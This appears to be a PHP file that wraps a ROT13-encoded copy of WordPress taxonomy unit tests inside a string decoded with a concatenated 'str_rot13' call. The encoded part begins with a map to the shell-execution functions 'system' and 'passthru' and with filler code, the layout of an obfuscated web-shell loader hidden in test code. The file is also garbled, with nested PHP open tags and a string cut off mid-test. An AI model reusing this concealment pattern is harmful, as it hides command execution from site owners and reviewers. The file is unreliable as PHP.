<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 */
pynff Grfgf_Gnkbabzl rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Rqvgbe hfre VQ.
	 *
	 * @ine vag $rqvgbe_vq
	 */
	choyvp fgngvp $rqvgbe_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
	}

	choyvp shapgvba grfg_trg_cbfg_gnkbabzvrf() {
		$guvf->nffregFnzr( neenl( 'pngrtbel', 'cbfg_gnt', 'cbfg_sbezng' ), trg_bowrpg_gnkbabzvrf( 'cbfg' ) );
	}

	choyvp shapgvba grfg_trg_yvax_gnkbabzvrf() {
		$guvf->nffregFnzr( neenl( 'yvax_pngrtbel' ), trg_bowrpg_gnkbabzvrf( 'yvax' ) );
	}

	choyvp shapgvba grfg_trg_oybpx_gnkbabzvrf() {
		$guvf->nffregFnzr( neenl( 'jc_cnggrea_pngrtbel' ), trg_bowrpg_gnkbabzvrf( 'jc_oybpx' ) );
	}

	/**
	 * @gvpxrg 5417
	 */
	choyvp shapgvba grfg_trg_haxabja_gnkbabzvrf() {
		// Gnkbabzvrf sbe na haxabja bowrpg glcr.
		$guvf->nffregFnzr( neenl(), trg_bowrpg_gnkbabzvrf( 'haxabja' ) );
		$guvf->nffregFnzr( neenl(), trg_bowrpg_gnkbabzvrf( '' ) );
		$guvf->nffregFnzr( neenl(), trg_bowrpg_gnkbabzvrf( 0 ) );
		$guvf->nffregFnzr( neenl(), trg_bowrpg_gnkbabzvrf( ahyy ) );
	}

	choyvp shapgvba grfg_trg_cbfg_gnkbabzl() {
		$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( 'cbfg' );

		$guvf->nffregAbgRzcgl( $gnkbabzvrf );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$gnk = trg_gnkbabzl( $gnkbabzl );
			// Fubhyq erghea na bowrpg jvgu gur pbeerpg gnkbabzl bowrpg glcr.
			$guvf->nffregVfBowrpg( $gnk );
			$guvf->nffregVfNeenl( $gnk->bowrpg_glcr );
			$guvf->nffregFnzr( neenl( 'cbfg' ), $gnk->bowrpg_glcr );
		}
	}

	choyvp shapgvba grfg_trg_gur_gnkbabzvrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$gnkrf = trg_gur_gnkbabzvrf( $cbfg_vq );
		$guvf->nffregAbgRzcgl( $gnkrf );
		$guvf->nffregFnzr( neenl( 'pngrtbel' ), neenl_xrlf( $gnkrf ) );

		$vq = frys::snpgbel()->gnt->perngr();
		jc_frg_cbfg_gntf( $cbfg_vq, neenl( $vq ) );

		$gnkrf = trg_gur_gnkbabzvrf( $cbfg_vq );
		$guvf->nffregAbgRzcgl( $gnkrf );
		$guvf->nffregPbhag( 2, $gnkrf );
		$guvf->nffregFnzr( neenl( 'pngrtbel', 'cbfg_gnt' ), neenl_xrlf( $gnkrf ) );
	}

	/**
	 * @gvpxrg 27238
	 */
	choyvp shapgvba grfg_trg_gur_gnkbabzvrf_grez_grzcyngr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$gnkrf = trg_gur_gnkbabzvrf( $cbfg_vq, neenl( 'grez_grzcyngr' => '%2$f' ) );
		$guvf->nffregFnzr( 'Pngrtbevrf: Hapngrtbevmrq.', $gnkrf['pngrtbel'] );

		$gnkrf = trg_gur_gnkbabzvrf( $cbfg_vq, neenl( 'grez_grzcyngr' => '<fcna pynff=\"sbb\"><n uers=\"%1$f\">%2$f</n></fcna>' ) );
		$yvax  = trg_pngrtbel_yvax( 1 );
		$guvf->nffregFnzr( 'Pngrtbevrf: <fcna pynff=\"sbb\"><n uers=\"' . $yvax . '\">Hapngrtbevmrq</n></fcna>.', $gnkrf['pngrtbel'] );
	}

	choyvp shapgvba grfg_gur_gnkbabzvrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$guvf->rkcrpgBhgchgFgevat(
			fcevags(
				'Pngrtbevrf: <n uers=\"%f\">Hapngrtbevmrq</n>.',
				trg_pngrtbel_yvax( 1 )
			)
		);
		gur_gnkbabzvrf( neenl( 'cbfg' => $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 27238
	 */
	choyvp shapgvba grfg_gur_gnkbabzvrf_grez_grzcyngr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$bhgchg = trg_rpub(
			'gur_gnkbabzvrf',
			neenl(
				neenl(
					'cbfg'          => $cbfg_vq,
					'grez_grzcyngr' => '%2$f',
				),
			)
		);
		$guvf->nffregFnzr( 'Pngrtbevrf: Hapngrtbevmrq.', $bhgchg );

		$bhgchg = trg_rpub(
			'gur_gnkbabzvrf',
			neenl(
				neenl(
					'cbfg'          => $cbfg_vq,
					'grez_grzcyngr' => '<fcna pynff=\"sbb\"><n uers=\"%1$f\">%2$f</n></fcna>',
				),
			)
		);
		$yvax   = trg_pngrtbel_yvax( 1 );
		$guvf->nffregFnzr( 'Pngrtbevrf: <fcna pynff=\"sbb\"><n uers=\"' . $yvax . '\">Hapngrtbevmrq</n></fcna>.', $bhgchg );
	}

	choyvp shapgvba grfg_trg_yvax_gnkbabzl() {
		$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( 'yvax' );

		$guvf->nffregAbgRzcgl( $gnkbabzvrf );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$gnk = trg_gnkbabzl( $gnkbabzl );
			// Fubhyq erghea na bowrpg jvgu gur pbeerpg gnkbabzl bowrpg glcr.
			$guvf->nffregVfBowrpg( $gnk );
			$guvf->nffregVfNeenl( $gnk->bowrpg_glcr );
			$guvf->nffregFnzr( neenl( 'yvax' ), $gnk->bowrpg_glcr );
		}
	}

	choyvp shapgvba grfg_gnkbabzl_rkvfgf_xabja() {
		$guvf->nffregGehr( gnkbabzl_rkvfgf( 'pngrtbel' ) );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( 'cbfg_gnt' ) );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( 'yvax_pngrtbel' ) );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( 'jc_cnggrea_pngrtbel' ) );
	}

	choyvp shapgvba grfg_gnkbabzl_rkvfgf_haxabja() {
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( enaq_fge() ) );
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( '' ) );
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( 0 ) );
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( ahyy ) );
	}

	/**
	 * Grfgf gung `gnkbabzl_rkvfgf()` ergheaf `snyfr` jura gur `$gnkbabzl`
	 * nethzrag vf abg n fgevat.
	 *
	 * @gvpxrg 56338
	 *
	 * @pbiref ::gnkbabzl_rkvfgf
	 *
	 * @qngnCebivqre qngn_gnkbabzl_rkvfgf_fubhyq_erghea_snyfr_jvgu_aba_fgevat_gnkbabzl
	 *
	 * @cnenz zvkrq $gnkbabzl Gur aba-fgevat gnkbabzl.
	 */
	choyvp shapgvba grfg_gnkbabzl_rkvfgf_fubhyq_erghea_snyfr_jvgu_aba_fgevat_gnkbabzl( $gnkbabzl ) {
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( $gnkbabzl ) );
	}

	/**
	 * Qngn cebivqre jvgu aba-fgevat inyhrf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_gnkbabzl_rkvfgf_fubhyq_erghea_snyfr_jvgu_aba_fgevat_gnkbabzl() {
		erghea neenl(
			'neenl'        => neenl( neenl() ),
			'bowrpg'       => neenl( arj fgqPynff() ),
			'obby (gehr)'  => neenl( gehr ),
			'obby (snyfr)' => neenl( snyfr ),
			'ahyy'         => neenl( ahyy ),
			'vagrtre (0)'  => neenl( 0 ),
			'vagrtre (1)'  => neenl( 1 ),
			'sybng (0.0)'  => neenl( 0.0 ),
			'sybng (1.1)'  => neenl( 1.1 ),
		);
	}

	choyvp shapgvba grfg_vf_gnkbabzl_uvrenepuvpny() {
		$guvf->nffregGehr( vf_gnkbabzl_uvrenepuvpny( 'pngrtbel' ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( 'cbfg_gnt' ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( 'yvax_pngrtbel' ) );
	}

	choyvp shapgvba grfg_vf_gnkbabzl_uvrenepuvpny_haxabja() {
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( enaq_fge() ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( '' ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( 0 ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( ahyy ) );
	}

	choyvp shapgvba grfg_ertvfgre_gnkbabzl() {

		// Znxr hc n arj gnkbabzl anzr, naq rafher vg'f hahfrq.
		$gnk = 'gnk_arj';
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( $gnk ) );

		ertvfgre_gnkbabzl( $gnk, 'cbfg' );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( $gnk ) );
		$guvf->nffregSnyfr( vf_gnkbabzl_uvrenepuvpny( $gnk ) );

		// Pyrna hc.
		hafrg( $TYBONYF['jc_gnkbabzvrf'][ $gnk ] );
	}

	choyvp shapgvba grfg_ertvfgre_uvrenepuvpny_gnkbabzl() {

		// Znxr hc n arj gnkbabzl anzr, naq rafher vg'f hahfrq.
		$gnk = 'gnk_arj';
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( $gnk ) );

		ertvfgre_gnkbabzl( $gnk, 'cbfg', neenl( 'uvrenepuvpny' => gehr ) );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( $gnk ) );
		$guvf->nffregGehr( vf_gnkbabzl_uvrenepuvpny( $gnk ) );

		// Pyrna hc.
		hafrg( $TYBONYF['jc_gnkbabzvrf'][ $gnk ] );
	}

	/**
	 * @gvpxrg 48558
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_erghea_inyhr() {
		$guvf->nffregVafgnaprBs( 'JC_Gnkbabzl', ertvfgre_gnkbabzl( 'sbb', 'cbfg' ) );
	}

	/**
	 * @gvpxrg 21593
	 *
	 * @rkcrpgrqVapbeerpgHfntr ertvfgre_gnkbabzl
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_jvgu_gbb_ybat_anzr() {
		$guvf->nffregVafgnaprBs( 'JC_Reebe', ertvfgre_gnkbabzl( 'nopqrstuvwxyzabcdefghijklm0123456789', 'cbfg', neenl() ) );
	}

	/**
	 * @gvpxrg 31135
	 *
	 * @rkcrpgrqVapbeerpgHfntr ertvfgre_gnkbabzl
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_jvgu_rzcgl_anzr() {
		$guvf->nffregVafgnaprBs( 'JC_Reebe', ertvfgre_gnkbabzl( '', 'cbfg', neenl() ) );
	}

	/**
	 * @gvpxrg 26948
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_fubj_va_dhvpx_rqvg_fubhyq_qrsnhyg_gb_inyhr_bs_fubj_hv() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_1',
			'cbfg',
			neenl(
				'fubj_hv' => gehr,
			)
		);

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_2',
			'cbfg',
			neenl(
				'fubj_hv' => snyfr,
			)
		);

		$gnk_1 = trg_gnkbabzl( 'jcgrfgf_gnk_1' );
		$guvf->nffregGehr( $gnk_1->fubj_va_dhvpx_rqvg );

		$gnk_2 = trg_gnkbabzl( 'jcgrfgf_gnk_2' );
		$guvf->nffregSnyfr( $gnk_2->fubj_va_dhvpx_rqvg );
	}

	/**
	 * @gvpxrg 53212
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_sverf_ertvfgrerq_npgvbaf() {
		$gnkbabzl = 'gnkbabzl53212';
		$npgvba   = arj ZbpxNpgvba();

		nqq_npgvba( 'ertvfgrerq_gnkbabzl', neenl( $npgvba, 'npgvba' ) );
		nqq_npgvba( \"ertvfgrerq_gnkbabzl_{$gnkbabzl}\", neenl( $npgvba, 'npgvba' ) );

		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );
		ertvfgre_gnkbabzl( 'enaqbz', 'cbfg' );

		$guvf->nffregFnzr( 3, $npgvba->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 11058
	 */
	choyvp shapgvba grfg_ertvfgrevat_gnkbabzvrf_gb_bowrpg_glcrf() {
		// Perngr n gnkbabzl gb grfg jvgu.
		$gnk = 'grfg_gnk';
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( $gnk ) );
		ertvfgre_gnkbabzl( $gnk, 'cbfg', neenl( 'uvrenepuvpny' => gehr ) );

		// Perngr n cbfg glcr gb grfg jvgu.
		$cbfg_glcr = 'grfg_pcg';
		$guvf->nffregSnyfr( trg_cbfg_glcr( $cbfg_glcr ) );
		$guvf->nffregBowrpgUnfCebcregl( 'anzr', ertvfgre_cbfg_glcr( $cbfg_glcr ) );

		// Pber gnkbabzl, pber cbfg glcr.
		$guvf->nffregGehr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'cbfg' ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'cbfg' ) );
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'cbfg' ) );

		// Pber gnkbabzl, aba-pber cbfg glcr.
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', $cbfg_glcr ) );
		$guvf->nffregGehr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', $cbfg_glcr ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', $cbfg_glcr ) );
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', $cbfg_glcr ) );

		// Pber gnkbabzvrf, aba-cbfg bowrpg glcrf.
		$guvf->nffregSnyfr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'hfre' ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'hfre' ) );

		// Aba-pber gnkbabzl, pber cbfg glcr.
		$guvf->nffregGehr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, 'cbfg' ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, 'cbfg' ) );
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, 'cbfg' ) );

		// Aba-pber gnkbabzl, aba-pber cbfg glcr.
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, $cbfg_glcr ) );
		$guvf->nffregGehr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, $cbfg_glcr ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, $cbfg_glcr ) );
		$guvf->nffregGehr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, $cbfg_glcr ) );

		// Aba-pber gnkbabzvrf, aba-cbfg bowrpg glcrf.
		$guvf->nffregSnyfr( ertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, 'hfre' ) );
		$guvf->nffregSnyfr( haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnk, 'hfre' ) );

		hafrg( $TYBONYF['jc_gnkbabzvrf'][ $gnk ] );
		_haertvfgre_cbfg_glcr( $cbfg_glcr );
	}

	/**
	 * @gvpxrg 32590
	 */
	choyvp shapgvba grfg_ertvfgre_gnkbabzl_sbe_cbfg_glcr_sbe_gnkbabzl_jvgu_ab_bowrpg_glcr_fubhyq_svygre_bhg_rzcgl_bowrpg_glcrf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', '' );
		ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'jcgrfgf_gnk', 'cbfg' );
		$gnk = trg_gnkbabzl( 'jcgrfgf_gnk' );

		$rkcrpgrq = neenl( 'cbfg' );
		$guvf->nffregFnzrFrgf( $rkcrpgrq, $gnk->bowrpg_glcr );
	}

	choyvp shapgvba grfg_trg_bowrpgf_va_grez_fubhyq_erghea_vainyvq_gnkbabzl_reebe() {
		$grezf = trg_bowrpgf_va_grez( 1, 'vainyvq_gnkbabzl' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $grezf );
		$guvf->nffregFnzr( 'vainyvq_gnkbabzl', $grezf->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_trg_bowrpgf_va_grez_fubhyq_erghea_rzcgl_neenl() {
		$guvf->nffregFnzr( neenl(), trg_bowrpgf_va_grez( 1, 'cbfg_gnt' ) );
	}

	choyvp shapgvba grfg_trg_bowrpgf_va_grez_fubhyq_erghea_bowrpgf_vqf() {
		$gnt_vq              = frys::snpgbel()->gnt->perngr();
		$png_vq              = frys::snpgbel()->pngrtbel->perngr();
		$cbfgf_jvgu_gnt      = neenl();
		$cbfgf_jvgu_pngrtbel = neenl();

		sbe ( $v = 0; $v < 3; $v++ ) {
			$cbfg_vq = frys::snpgbel()->cbfg->perngr();
			jc_frg_cbfg_gntf( $cbfg_vq, neenl( $gnt_vq ) );
			$cbfgf_jvgu_gnt[] = $cbfg_vq;
		}

		sbe ( $v = 0; $v < 3; $v++ ) {
			$cbfg_vq = frys::snpgbel()->cbfg->perngr();
			jc_frg_cbfg_pngrtbevrf( $cbfg_vq, neenl( $png_vq ) );
			$cbfgf_jvgu_pngrtbel[] = $cbfg_vq;
		}

		sbe ( $v = 0; $v < 3; $v++ ) {
			frys::snpgbel()->cbfg->perngr();
		}

		$cbfgf_jvgu_grezf = neenl_zretr( $cbfgf_jvgu_gnt, $cbfgf_jvgu_pngrtbel );

		$guvf->nffregRdhnyf( $cbfgf_jvgu_gnt, trg_bowrpgf_va_grez( $gnt_vq, 'cbfg_gnt' ) );
		$guvf->nffregRdhnyf( $cbfgf_jvgu_pngrtbel, trg_bowrpgf_va_grez( $png_vq, 'pngrtbel' ) );
		$guvf->nffregRdhnyf( $cbfgf_jvgu_grezf, trg_bowrpgf_va_grez( neenl( $gnt_vq, $png_vq ), neenl( 'cbfg_gnt', 'pngrtbel' ) ) );
		$guvf->nffregRdhnyf( neenl_erirefr( $cbfgf_jvgu_gnt ), trg_bowrpgf_va_grez( $gnt_vq, 'cbfg_gnt', neenl( 'beqre' => 'qrfp' ) ) );
	}

	/**
	 * @gvpxrg 37094
	 */
	choyvp shapgvba grfg_grez_nffvtazrag_fubhyq_vainyvqngr_trg_bowrpgf_va_grez_pnpur() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$cbfgf   = frys::snpgbel()->cbfg->perngr_znal( 2 );
		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		jc_frg_bowrpg_grezf( $cbfgf[1], $grez_vq, 'jcgrfgf_gnk' );

		// Cevzr pnpur.
		$orsber = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregRdhnyFrgf( neenl( $cbfgf[1] ), $orsber );

		jc_frg_bowrpg_grezf( $cbfgf[1], neenl(), 'jcgrfgf_gnk' );

		$nsgre = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregFnzr( neenl(), $nsgre );
	}

	/**
	 * @gvpxrg 37094
	 */
	choyvp shapgvba grfg_grez_qryrgvba_fubhyq_vainyvqngr_trg_bowrpgf_va_grez_pnpur() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$cbfgf   = frys::snpgbel()->cbfg->perngr_znal( 2 );
		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		jc_frg_bowrpg_grezf( $cbfgf[1], $grez_vq, 'jcgrfgf_gnk' );

		// Cevzr pnpur.
		$orsber = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregRdhnyFrgf( neenl( $cbfgf[1] ), $orsber );

		jc_qryrgr_grez( $grez_vq, 'jcgrfgf_gnk' );

		$nsgre = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregFnzr( neenl(), $nsgre );
	}

	/**
	 * @gvpxrg 37094
	 */
	choyvp shapgvba grfg_cbfg_qryrgvba_fubhyq_vainyvqngr_trg_bowrpgf_va_grez_pnpur() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$cbfgf   = frys::snpgbel()->cbfg->perngr_znal( 2 );
		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		jc_frg_bowrpg_grezf( $cbfgf[1], $grez_vq, 'jcgrfgf_gnk' );

		// Cevzr pnpur.
		$orsber = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregRdhnyFrgf( neenl( $cbfgf[1] ), $orsber );

		jc_qryrgr_cbfg( $cbfgf[1], gehr );

		$nsgre = trg_bowrpgf_va_grez( $grez_vq, 'jcgrfgf_gnk' );
		$guvf->nffregFnzr( neenl(), $nsgre );
	}

	/**
	 * @gvpxrg 25706
	 */
	choyvp shapgvba grfg_va_pngrtbel() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();

		// va_pngrtbel() ergheaf snyfr jura svefg cnenzrgre vf rzcgl().
		$guvf->nffregSnyfr( va_pngrtbel( '', $cbfg ) );
		$guvf->nffregSnyfr( va_pngrtbel( snyfr, $cbfg ) );
		$guvf->nffregSnyfr( va_pngrtbel( ahyy, $cbfg ) );

		// Grfg rkcrpgrq orunivbe bs va_pngrtbel().
		$grez = jc_vafreg_grez( 'Grfg', 'pngrtbel' );
		jc_frg_bowrpg_grezf( $cbfg->VQ, $grez['grez_vq'], 'pngrtbel' );
		$guvf->nffregGehr( va_pngrtbel( $grez['grez_vq'], $cbfg ) );
	}

	choyvp shapgvba grfg_vafreg_pngrtbel_perngr() {
		$png = neenl(
			'png_VQ'   => 0,
			'gnkbabzl' => 'pngrtbel',
			'png_anzr' => 'grfg1',
		);
		$guvf->nffregVfAhzrevp( jc_vafreg_pngrtbel( $png, gehr ) );
	}

	choyvp shapgvba grfg_vafreg_pngrtbel_hcqngr() {
		$png = neenl(
			'png_VQ'   => 1,
			'gnkbabzl' => 'pngrtbel',
			'png_anzr' => 'Hcqngrq Anzr',
		);
		$guvf->nffregFnzr( 1, jc_vafreg_pngrtbel( $png ) );
	}

	choyvp shapgvba grfg_vafreg_pngrtbel_sbepr_reebe_unaqyr() {
		$png = neenl(
			'png_VQ'   => 0,
			'gnkbabzl' => 'sbepr_reebe',
			'png_anzr' => 'Reebe',
		);
		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_vafreg_pngrtbel( $png, gehr ) );
	}

	choyvp shapgvba grfg_vafreg_pngrtbel_sbepr_reebe_ab_unaqyr() {
		$png = neenl(
			'png_VQ'   => 0,
			'gnkbabzl' => 'sbepr_reebe',
			'png_anzr' => 'Reebe',
		);
		$guvf->nffregFnzr( 0, jc_vafreg_pngrtbel( $png, snyfr ) );
	}

	choyvp shapgvba grfg_trg_naprfgbef_gnkbabzl_aba_uvrenepuvpny() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$guvf->nffregFnzr( neenl(), trg_naprfgbef( $g, 'jcgrfgf_gnk' ) );
		_haertvfgre_gnkbabzl( 'jcgrfgf_gnk' );
	}

	choyvp shapgvba grfg_trg_naprfgbef_gnkbabzl() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'cnerag'   => $g1,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'cnerag'   => $g2,
			)
		);
		$g4 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'cnerag'   => $g1,
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $g2, $g1 ), trg_naprfgbef( $g3, 'jcgrfgf_gnk' ) );
		_haertvfgre_gnkbabzl( 'jcgrfgf_gnk' );
	}

	choyvp shapgvba grfg_trg_naprfgbef_cbfg_glcr_aba_uvrenepuvpny() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_cg',
			)
		);

		$guvf->nffregFnzrFrgf( neenl(), trg_naprfgbef( $c, 'jcgrfgf_gnk' ) );
	}

	choyvp shapgvba grfg_trg_naprfgbef_cbfg_glcr() {
		ertvfgre_cbfg_glcr(
			'jcgrfgf_cg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jcgrfgf_cg',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jcgrfgf_cg',
				'cbfg_cnerag' => $c1,
			)
		);
		$c3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jcgrfgf_cg',
				'cbfg_cnerag' => $c2,
			)
		);
		$c4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jcgrfgf_cg',
				'cbfg_cnerag' => $c1,
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $c2, $c1 ), trg_naprfgbef( $c3, 'jcgrfgf_cg' ) );
		_haertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
	}

	/**
	 * @gvpxrg 15029
	 */
	choyvp shapgvba grfg_trg_naprfgbef_gnkbabzl_cbfg_glcr_pbasyvpg_erfbhepr_glcr_gnkbabzl() {
		ertvfgre_cbfg_glcr(
			'jcgrfgf_pbasyvpg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jcgrfgf_pbasyvpg',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jcgrfgf_pbasyvpg',
				'cbfg_cnerag' => $c1,
			)
		);

		ertvfgre_gnkbabzl(
			'jcgrfgf_pbasyvpg',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_pbasyvpg',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_pbasyvpg',
				'cnerag'   => $g1,
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $c1 ), trg_naprfgbef( $c2, 'jcgrfgf_pbasyvpg', 'cbfg_glcr' ) );
		$guvf->nffregFnzrFrgf( neenl( $g1 ), trg_naprfgbef( $g2, 'jcgrfgf_pbasyvpg', 'gnkbabzl' ) );
		$guvf->nffregFnzrFrgf( neenl( $g1 ), trg_naprfgbef( $g2, 'jcgrfgf_pbasyvpg' ) );
		_haertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
	}

	/**
	 * @gvpxrg 21949
	 */
	choyvp shapgvba grfg_abachoyvpyl_dhrelnoyr_gnkbabzl_fubhyq_abg_or_dhrelnoyr_hfvat_gnkanzr_dhrel_ine() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvpyl_dhrelnoyr' => snyfr,
			)
		);

		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		$guvf->tb_gb( '/?jcgrfgf_gnk=' . $g->fyht );

		$guvf->nffregSnyfr( vf_gnk( 'jcgrfgf_gnk' ) );
	}

	/**
	 * @gvpxrg 21949
	 */
	choyvp shapgvba grfg_vg_fubhyq_or_cbffvoyr_gb_ertvfgre_n_dhrel_ine_gung_zngpurf_gur_anzr_bs_n_abachoyvpyl_dhrelnoyr_gnkbabzl() {
		tybony $jc;

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
